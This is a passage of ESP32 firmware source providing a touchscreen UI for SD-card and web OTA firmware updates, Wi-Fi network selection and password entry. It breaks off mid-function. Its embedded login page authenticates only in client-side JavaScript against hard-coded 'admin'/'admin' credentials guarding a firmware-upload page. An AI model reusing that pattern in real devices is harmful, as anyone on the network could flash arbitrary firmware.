void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled);
void drawMenu();
bool checkButton(int16_t x, int16_t y, int buttonX, int buttonY, int buttonW, int buttonH);
void waitForTouch();
void performSDUpdate();
void drawNetworkList(int, int, NetworkInfo*, int);
bool selectWiFiNetwork();
void drawInputField();
void drawKeyboard();
bool enterWiFiPassword();
void performWebOTAUpdate();

const char* loginIndex = R"(
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>ESP32 Login Page</title>
    <style>
        body {
            background-color: #1A1A1A;
            color: #E0E0E0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #2A2A2A;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h2 {
            margin-bottom: 1.5rem;
            font-size: 1.8rem;
            color: #FFFFFF;
        }
        .form-group {
            margin-bottom: 1.5rem;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 0.5rem;
            font-size: 1rem;
            color: #E0E0E0;
        }
        input[type='text'],
        input[type='password'] {
            width: 100%;
            padding: 0.8rem;
            border: 1px solid #4A4A4A;
            border-radius: 5px;
            background-color: #3A3A3A;
            color: #E0E0E0;
            font-size: 1rem;
            box-sizing: border-box;
        }
        input[type='submit'] {
            width: 100%;
            padding: 0.8rem;
            border: none;
            border-radius: 5px;
            background-color: #FFE221;
            color: #1A1A1A;
            font-size: 1rem;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        input[type='submit']:hover {
            background-color: #FFF14A;
        }
    </style>
</head>
<body>
    <div class='container'>
        <h2>ESP32 Login Page</h2>
        <form name='loginForm'>
            <div class='form-group'>
                <label for='userid'>Username:</label>
                <input type='text' name='userid' id='userid'>
            </div>
            <div class='form-group'>
                <label for='pwd'>Password:</label>
                <input type='password' name='pwd' id='pwd'>
            </div>
            <input type='submit' onclick='check(this.form); return false;' value='Login'>
        </form>
    </div>
    <script>
        function check(form) {
            if (form.userid.value == 'admin' && form.pwd.value == 'admin') {
                window.open('/serverIndex');
            } else {
                alert('Error Password or Username');
            }
        }
    </script>
</body>
</html>
)";

const char* serverIndex = R"(
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>ESP32 Firmware Update</title>
    <script src='https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
    <style>
        body {
            background-color: #1A1A1A;
            color: #E0E0E0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #2A2A2A;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h2 {
            margin-bottom: 1.5rem;
            font-size: 1.8rem;
            color: #FFFFFF;
        }
        .form-group {
            margin-bottom: 1.5rem;
        }
        input[type='file'] {
            width: 100%;
            padding: 0.8rem;
            border: 1px solid #4A4A4A;
            border-radius: 5px;
            background-color: #3A3A3A;
            color: #E0E0E0;
            font-size: 1rem;
            box-sizing: border-box;
            cursor: pointer;
        }
        input[type='file']::-webkit-file-upload-button {
            background-color: #4A4A4A;
            color: #E0E0E0;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        input[type='file']::-webkit-file-upload-button:hover {
            background-color: #5A5A5A;
        }
        input[type='submit'] {
            width: 100%;
            padding: 0.8rem;
            border: none;
            border-radius: 5px;
            background-color: #FFE221;
            color: #1A1A1A;
            font-size: 1rem;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        input[type='submit']:hover {
            background-color: #FFF14A;
        }
        #progress-container {
            margin-top: 1rem;
            width: 100%;
            background-color: #3A3A3A;
            border-radius: 5px;
            overflow: hidden;
        }
        #prg {
            width: 0%;
            height: 20px;
            background-color: #FFE221;
            text-align: center;
            line-height: 20px;
            color: #1A1A1A;
            border-radius: 5px;
            transition: width 0.3s ease-in-out;
        }
    </style>
</head>
<body>
    <div class='container'>
        <h2>Firmware Update</h2>
        <form method='POST' action='#' enctype='multipart/form-data' id='upload_form'>
            <div class='form-group'>
                <input type='file' name='update'>
            </div>
            <input type='submit' value='Update'>
        </form>
        <div id='progress-container'>
            <div id='prg'>progress: 0%</div>
        </div>
    </div>
    <script>
        $('form').submit(function(e) {
            e.preventDefault();
            var form = $('#upload_form')[0];
            var data = new FormData(form);
            $.ajax({
                url: '/update',
                type: 'POST',
                data: data,
                contentType: false,
                processData: false,
                xhr: function() {
                    var xhr = new window.XMLHttpRequest();
                    xhr.upload.addEventListener('progress', function(evt) {
                        if (evt.lengthComputable) {
                            var per = evt.loaded / evt.total;
                            var percent = Math.round(per * 100);
                            $('#prg').css('width', percent + '%').text('progress: ' + percent + '%');
                        }
                    }, false);
                    return xhr;
                },
                success: function(d, s) {
                    console.log('success!');
                },
                error: function(a, b, c) {
                    console.log('error:', c);
                }
            });
        });
    </script>
</body>
</html>
)";


static bool uiDrawn = false;

void runUI() {
#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 1

  static int iconX[ICON_NUM] = {10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {             
    bitmap_icon_go_back // Added back icon
  };

  if (!uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;  
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0: 
      break;

    case 1: 
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;

    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;

    case 3: 
      switch (activeIcon) {
         case 0: // Back icon action (exit to submenu)
           feature_exit_requested = true;
           animationState = 0;
           activeIcon = -1;
          break;
      }
      break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;  

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    if (ts.touched() && feature_active) {
      TS_Point p = ts.getPoint();
      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
      int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);

      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = millis();
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}


void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
  uint16_t color = disabled ? TFT_DARKGREY : (highlight ? TFT_DARKGREY : ORANGE);
  tft.fillRect(x, y, w, h, color);
  tft.drawRect(x, y, w, h, TFT_WHITE);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(0);

  int16_t textWidth = strlen(label) * 6;
  int16_t textX = x + (w - textWidth) / 2;
  int16_t textY = y + (h - 6) / 2;
  tft.setCursor(textX, textY);
  tft.println(label);
}

void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled) {
  tft.fillRect(0, TAB_Y, SCREEN_WIDTH, TAB_BUTTON_HEIGHT, TFT_DARKGREY);

  if (leftButton[0]) {
    drawButton(TAB_LEFT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT, leftButton, false, leftDisabled);
  }
  if (prevButton[0]) {
    drawButton(TAB_MIDDLE_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT, prevButton, false, prevDisabled);
  }
  if (nextButton[0]) {
    drawButton(TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT, nextButton, false, nextDisabled);
  }
}

void drawMenu() {
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  tft.setTextSize(1);

  drawButton(BUTTON1_X, BUTTON1_Y, BUTTON_WIDTH, BUTTON_HEIGHT, "SD Update", false, false);
  drawButton(BUTTON2_X, BUTTON2_Y, BUTTON_WIDTH, BUTTON_HEIGHT, "Web OTA", false, false);

}

bool checkButton(int16_t x, int16_t y, int buttonX, int buttonY, int buttonW, int buttonH) {
  return (x > buttonX && x < buttonX + buttonW && y > buttonY && y < buttonY + buttonH);
}

void waitForTouch() {
  while (!ts.touched()) {
    delay(10);
  }
  delay(200);
}

int yshift = 40;

void performSDUpdate() {
  updateStatusBar();
  runUI();
  uiDrawn = false;
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setCursor(10, 10 + yshift);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.println("SD Update");
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setCursor(10, 30 + yshift);
  tft.println("Insert SD card with");
  tft.setCursor(10, 40 + yshift);
  tft.println("firmware.bin in root");
  tft.setCursor(10, 50 + yshift);
  tft.println("Touch Start to update");

  drawTabBar("Start", false, "", false, "Back", false);

  bool waitingForStart = true;
  
  while (waitingForStart) {
    if (ts.touched()) {
      TS_Point p = ts.getPoint();
      int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
      int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      if (checkButton(x, y, TAB_LEFT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        waitingForStart = false;
      }
      delay(50);
    }
  }

  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setCursor(10, 10 + yshift);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.println("Starting SD Update...");
  drawTabBar("", false, "", false, "Back", false);

  bool proceed = true;
  while (proceed) {
    if (ts.touched()) {
      TS_Point p = ts.getPoint();
      int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
      int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      delay(50);
    }

    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(10, 30 + yshift);
    tft.println("Initializing SD...");
    if (!SD.begin(SD_CS_PIN)) {
      tft.setTextColor(TFT_RED, TFT_BLACK);
      tft.setCursor(10, 40 + yshift);
      tft.println("X SD init failed!");
      tft.setCursor(10, 50 + yshift);
      tft.println("Touch to retry or Back");
      waitForTouch();
      TS_Point p = ts.getPoint();
      int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
      int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      continue;
    }
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.setCursor(10, 40 + yshift);
    tft.println("SD card OK");

    if (!SD.exists(FIRMWARE_FILE)) {
      tft.setTextColor(TFT_RED, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("X Firmware not found!");
      tft.setCursor(10, 40 + yshift);
      tft.println("Touch to retry or Back");
      waitForTouch();
      TS_Point p = ts.getPoint();
      int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
      int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      continue;
    }

    File firmwareFile = SD.open(FIRMWARE_FILE, FILE_READ);
    if (!firmwareFile) {
      tft.setTextColor(TFT_RED, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("X File open failed!");
      tft.setCursor(10, 40 + yshift);
      tft.println("Touch to retry or Back");
      waitForTouch();
      TS_Point p = ts.getPoint();
      int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
      int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      continue;
    }

    size_t fileSize = firmwareFile.size();
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(10, 50 + yshift);
    tft.printf("Size: %u bytes\n", fileSize);
    if (!Update.begin(fileSize)) {
      tft.setTextColor(TFT_RED, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("X Update init failed!");
      tft.setCursor(10, 40 + yshift);
      tft.println("Touch to retry or Back");
      waitForTouch();
      TS_Point p = ts.getPoint();
      int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
      int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      continue;
    }

    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(10, 60 + yshift);
    tft.println("Updating...");
    size_t written = Update.writeStream(firmwareFile);
    if (written != fileSize) {
      tft.setTextColor(TFT_RED, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("X Update failed!");
      tft.setCursor(10, 40 + yshift);
      tft.println("Touch to retry or Back");
      waitForTouch();
      TS_Point p = ts.getPoint();
      int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
      int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      continue;
    }

    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.setCursor(10, 20 + yshift);
    tft.println("Update OK!");
    if (Update.end(true)) {
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("Rebooting...");
      delay(2000);
      ESP.restart();
    } else {
      tft.setTextColor(TFT_RED, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("X Finalize failed!");
      tft.setCursor(10, 40 + yshift);
      tft.println("Touch to retry or Back");
      waitForTouch();
      TS_Point p = ts.getPoint();
      int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
      int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
      if (checkButton(x, y, TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      continue;
    }
    proceed = false;
  }
}



bool selectWiFiNetwork() {
  uiDrawn = false;
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  tft.setCursor(10, 50);
  tft.setTextColor(GREEN);
  tft.setTextSize(1);
  tft.println("Scanning...");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  int numNetworks = WiFi.scanNetworks();
  if (numNetworks <= 0) {
    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.setTextColor(GREEN);
    tft.setCursor(10, 50);
    tft.println("No networks found.");
    tft.setCursor(10, 60);
    tft.println("Touch to retry");
    drawTabBar("Rescan", false, "", true, "", true);
    while (!ts.touched()) {
      delay(10);
    }
    TS_Point p = ts.getPoint();
    int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
    int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
    delay(200);
    if (x >= TAB_LEFT_X && x < TAB_LEFT_X + TAB_BUTTON_WIDTH && y >= TAB_Y && y < TAB_Y + TAB_BUTTON_HEIGHT) {
      return selectWiFiNetwork();
    }
    return false;
  }

  NetworkInfo* networks = new NetworkInfo[numNetworks];
  for (int i = 0; i < numNetworks; i++) {
    strncpy(networks[i].ssid, WiFi.SSID(i).c_str(), 31);
    networks[i].ssid[31] = '\0';
    networks[i].rssi = WiFi.RSSI(i);
    networks[i].channel = WiFi.channel(i);
    networks[i].authmode = WiFi.encryptionType(i);
  }

  int startIndex = 0;
  int selectedIndex = -1;
  bool selected = false;
  while (!selected) {
    drawNetworkList(startIndex, numNetworks, networks, selectedIndex);
    while (!ts.touched()) {
      delay(10);
    }
    TS_Point p = ts.getPoint();
    int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
    int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
    delay(200);

    int y_pos = NETWORK_Y_START;
    int end_index = min(startIndex + NETWORKS_PER_PAGE, numNetworks);
    for (int i = startIndex; i < end_index && y_pos < 300; i++) {
      if (x >= 10 && x < SCREEN_WIDTH - 10 && y >= y_pos && y < y_pos + NETWORK_ROW_HEIGHT) {
        char buf[64];
        char ssid[12];
        strncpy(ssid, networks[i].ssid, 11);
        ssid[11] = '\0';
        if (strlen(networks[i].ssid) > 11) strcat(ssid, "...");
        const char* enc = networks[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
        snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid, networks[i].rssi, networks[i].channel, enc);
        tft.setTextColor(ORANGE, TFT_BLACK);
        tft.setTextSize(1);
        tft.setCursor(10, y_pos);
        tft.println(buf);
        delay(100);
        tft.setTextColor(i == selectedIndex ? ORANGE : (networks[i].authmode == WIFI_AUTH_OPEN ? ORANGE : TFT_WHITE), TFT_BLACK);
        tft.setCursor(10, y_pos);
        tft.println(buf);
        selectedIndex = i;
        strncpy(selectedSSID, networks[i].ssid, 31);
        selectedSSID[31] = '\0';
        selected = true;
        break;
      }
      y_pos += NETWORK_ROW_HEIGHT;
    }

    if (x >= TAB_LEFT_X && x < TAB_LEFT_X + TAB_BUTTON_WIDTH && y >= TAB_Y && y < TAB_Y + TAB_BUTTON_HEIGHT) {
      delete[] networks;
      return selectWiFiNetwork();
    }
    if (x >= TAB_MIDDLE_X && x < TAB_MIDDLE_X + TAB_BUTTON_WIDTH && y >= TAB_Y && y < TAB_Y + TAB_BUTTON_HEIGHT && startIndex > 0) {
      startIndex -= NETWORKS_PER_PAGE;
      selectedIndex = -1;
    }
    if (x >= TAB_RIGHT_X && x < TAB_RIGHT_X + TAB_BUTTON_WIDTH && y >= TAB_Y && y < TAB_Y + TAB_BUTTON_HEIGHT && startIndex + NETWORKS_PER_PAGE < numNetworks) {
      startIndex += NETWORKS_PER_PAGE;
      selectedIndex = -1;
    }
    if (x >= 0 && x < 30 && y >= 10 && y < 30) { // Back
      wifiPassword[0] = '\0';
      return false;
    }
  }

  delete[] networks;
  return true;
}

void drawNetworkList(int startIndex, int numNetworks, NetworkInfo* networks, int selectedIndex) {
  uiDrawn = false;
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setTextSize(1);

  if (numNetworks == 0) {
    tft.setTextColor(GREEN);
    tft.setCursor(10, 50);
    tft.println("No networks found.");
  } else {
    int y = 50;
    tft.setTextColor(GREEN);
    tft.setCursor(10, y);
    tft.println("Networks:");
    y += 20;

    int start_index = startIndex;
    int end_index = min(start_index + NETWORKS_PER_PAGE, numNetworks);

    for (int i = start_index; i < end_index && y < 300; i++) {
      char buf[64];
      char ssid[12];
      strncpy(ssid, networks[i].ssid, 11);
      ssid[11] = '\0';
      if (strlen(networks[i].ssid) > 11) strcat(ssid, "...");
      const char* enc = networks[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
      snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid, networks[i].rssi, networks[i].channel, enc);
      tft.setCursor(10, y);
      tft.setTextColor(i == selectedIndex ? ORANGE : (networks[i].authmode == WIFI_AUTH_OPEN ? ORANGE : TFT_WHITE));
      tft.println(buf);
      y += NETWORK_ROW_HEIGHT;
    }

    char page_buf[20];
    snprintf(page_buf, sizeof(page_buf), "Page %d/%d", start_index / NETWORKS_PER_PAGE + 1, (numNetworks + NETWORKS_PER_PAGE - 1) / NETWORKS_PER_PAGE);
    tft.setCursor(180, 50);
    tft.setTextColor(GREEN);
    tft.println(page_buf);
  }

  bool prevDisabled = startIndex == 0;
  bool nextDisabled = (startIndex + NETWORKS_PER_PAGE) >= numNetworks;
  drawTabBar("Rescan", false, "Prev", prevDisabled, "Next", nextDisabled);


}

void drawInputField() {
  tft.fillRect(0, 37, 240, 20, TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(1, 40);
  tft.print("Password: ");
  tft.print(wifiPassword);
  if (strlen(wifiPassword) < PASSWORD_MAX_LENGTH) {
    tft.print("_");
  }
}

void drawKeyboard() {
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  //tft.setCursor(1, 10);
  //tft.printf("Enter Password for %s", selectedSSID);

  tft.fillRect(0, 37, 240, 20, TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(1, 44);
  tft.print("Password: ");
  tft.print(wifiPassword);
  if (strlen(wifiPassword) < PASSWORD_MAX_LENGTH) {
    tft.print("_");
  }

  int yOffset = KEYBOARD_Y_OFFSET_START;
  for (int row = 0; row < 4; row++) {
    int xOffset = 10;
    for (int col = 0; col < strlen(keyboardLayout[row]); col++) {
      tft.fillRect(xOffset, yOffset, KEY_WIDTH, KEY_HEIGHT, TFT_DARKGREY);
      tft.setTextColor(TFT_WHITE);
      tft.setTextSize(1);
      tft.setCursor(xOffset + 5, yOffset + 4);
      tft.print(keyboardLayout[row][col]);
      xOffset += KEY_WIDTH + KEY_SPACING;
    }
    yOffset += KEY_HEIGHT + KEY_SPACING;
  }

  int buttonY = 160; // Original y=150 + 10
  tft.setTextColor(ORANGE);
  tft.setTextSize(1);
  tft.setTextDatum(MC_DATUM);

  tft.fillRoundRect(5, buttonY, 70, 25, 8, DARK_GRAY);
  tft.drawRoundRect(5, buttonY, 70, 25, 8, ORANGE);
  tft.drawString("Back", 40, buttonY + 12);

  tft.fillRoundRect(85, buttonY, 70, 25, 8, DARK_GRAY);
  tft.drawRoundRect(85, buttonY, 70, 25, 8, ORANGE);
  tft.drawString("Del", 120, buttonY + 12);

  tft.fillRoundRect(165, buttonY, 70, 25, 8, DARK_GRAY);
  tft.drawRoundRect(165, buttonY, 70, 25, 8, ORANGE);
  tft.drawString("OK", 200, buttonY + 12);

  tft.setTextColor(ORANGE);
  tft.setTextSize(1);
  tft.setCursor(1, 215);
  tft.println("[!] Enter the Wi-Fi password for the");
  tft.setCursor(24, 230);
  tft.println("selected network.");

  tft.setCursor(1, 250);
  tft.println("[!] Del: Removes last char from the");
  tft.setCursor(24, 265);
  tft.println("password.");
}

void updateInputField() {
  tft.fillRect(0, 37, 240, 20, TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(1, 44);
  tft.print("Password: ");
  tft.print(wifiPassword);
  if (strlen(wifiPassword) < PASSWORD_MAX_LENGTH) {
    tft.print("_");
   }
}

bool enterWiFiPassword() {
  wifiPassword[0] = '\0';
  drawKeyboard();

  bool done = false;
  while (!done) {
    while (!ts.touched()) {
      delay(10);
    }
    TS_Point p = ts.getPoint();
    int16_t x = map(p.x, TS_MIN_X, TS_MAX_X, 0, SCREEN_WIDTH - 1);
    int16_t y = map(p.y, TS_MAX_Y, TS_MIN_Y, 0, SCREEN_HEIGHT - 1);
    delay(200);

    int yOffset = KEYBOARD_Y_OFFSET_START;
    for (int row = 0; row < 4; row++) {
      int xOffset = 10;
      for (int col = 0; col < strlen(keyboardLayout[row]); col++) {
        if (x >= xOffset && x < xOffset + KEY_WIDTH && y >= yOffset && y < yOffset + KEY_HEIGHT) {
          char c = keyboardLayout[row][col];
          tft.fillRect(xOffset, yOffset, KEY_WIDTH, KEY_HEIGHT, ORANGE);
          tft.setTextColor(TFT_WHITE);
          tft.setTextSize(1);
          tft.setCursor(xOffset + 5, yOffset + 4);
          tft.print(c);
          delay(100);
          tft.fillRect(xOffset, yOffset, KEY_WIDTH, KEY_HEIGHT, TFT_DARKGREY);
          tft.setTextColor(TFT_WHITE);
          tft.setCursor(xOffset + 5, yOffset + 4);
          tft.print(c);
          if (c == '<') {
            if (strlen(wifiPassword) > 0) {
              wifiPassword[strlen(wifiPassword) - 1] = '\0';
            }
          } else if (c == '-') {
            wifiPassword[0] = '\0';
          } else if (c != ' ') {
            if (strlen(wifiPassword) < PASSWORD_MAX_LENGTH) {
              size_t len = strlen(wifiPassword);
              wifiPassword[len] = c;
              wifiPassword[len + 1] = '\0';
            }
          }
          updateInputField();
        }
        xOffset += KEY_WIDTH + KEY_SPACING;
      }
      yOffset += KEY_HEIGHT + KEY_SPACING;
    }

    // Check control buttons
    if (x >= 5 && x < 75 && y >= 160 && y < 185) { // Back
      wifiPassword[0] = '\0';
      return false;
    }
    if (x >= 85 && x < 155 && y >= 160 && y < 185) { // Del
      if (strlen(wifiPassword) > 0) {
        wifiPassword[strlen(wifiPassword) - 1] = '\0';
      }
      updateInputField();
    }
    if (x >= 165 && x < 235 && y >= 160 && y < 185) { // OK
      if (strlen(wifiPassword) > 0) {
        done = true;
      } 
    }
  }
  return true;
}

void performWebOTAUpdate() {
  uiDrawn = false;
  static size_t totalUploaded = 0;
  bool inUpdate = false;

  if (!selectWiFiNetwork()) {
    drawMenu();
    return;
  }

  if (!enterWiFiPassword()) {
    drawMenu();
    return;
  }

  updateStatusBar();
  runUI();
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setCursor(10, 10 + yshift);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.println("Starting Web OTA...");
  drawTabBar("", false, "", false, "Back", false);

